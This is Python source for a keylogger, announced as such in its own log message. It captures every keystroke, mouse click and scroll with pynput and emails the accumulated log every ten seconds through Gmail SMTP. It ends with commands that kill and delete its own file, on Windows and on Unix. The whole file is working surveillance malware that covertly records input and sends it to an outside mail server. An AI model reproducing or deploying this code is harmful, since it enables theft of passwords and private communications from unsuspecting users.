import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from pynput import mouse
from pynput.keyboard import Listener
from pynput.mouse import Listener

class logger:

	def __init__(self, email, password, sleep_time):
		self.sleep_time = sleep_time
		self.log = "KeyLogger Started..."
		self.email = email
		self.password = password

	def mail_data(self, email, password, message):
		server = smtplib.SMTP('smtp.gmail.com', 587)
		server.starttls()
		server.login(email, password)
		server.sendmail(email, email, message)
		server.quit()

	def periodic_report(self):
		self.mail_data(self.email,self.password, self.log)
		#print(self.log)
		self.log = ""
		timer = threading.Timer(self.sleep_time, self.periodic_report)
		timer.start()

	def log_data(self, string):
		self.log = self.log + string
		print(self.log)

	def save_data(self, key):
		try:
		    current_key = str(key.char)
		    #print(current_key)
		except AttributeError:
		    if key == key.space:
		        current_key = "SPACE"
		    elif key == key.esc:
		        current_key = "ESC"
		    else:
		        current_key = " " + str(key) + " "

		self.log_data(current_key)

	# def on_move(self, x, y):
	#     self.log_data("Mouse moved to ({0}, {1})".format(x, y))

	def on_click(self, x, y, button, pressed):
	    if pressed:
	        self.log_data(' Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button) + " ")

	def on_scroll(self, x, y, dx, dy):
	    self.log_data(' Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy) + " ")


	def start(self):
		# keyboard_listener = keyboard.Listener(on_press=self.save_data)
		# with keyboard_listener:
		#     #self.report()
		#     keyboard_listener.join()
		self.periodic_report()
		with mouse.Listener(on_click=self.on_click, on_scroll=self.on_scroll) as listener:
			with keyboard.Listener(on_press=self.save_data) as listener:
				listener.join()
		if os.name == "nt":
		    try:
		        pwd = os.path.abspath(os.getcwd())
		        os.system("cd " + pwd)
		        os.system("TASKKILL /F /IM " + os.path.basename(__file__))
		        print('File was closed.')
		        os.system("DEL " + os.path.basename(__file__))
		    except OSError:
		        print('File is close.')

		else:
		    try:
		        pwd = os.path.abspath(os.getcwd())
		        os.system("cd " + pwd)
		        os.system('pkill leafpad')
		        os.system("chattr -i " +  os.path.basename(__file__))
		        print('File was closed.')
		        os.system("rm -rf" + os.path.basename(__file__))
		    except OSError:
		        print('File is close.')


email_address = "your_email"
password = "your_password"

keylogger = logger(email_address, password,10)
keylogger.start()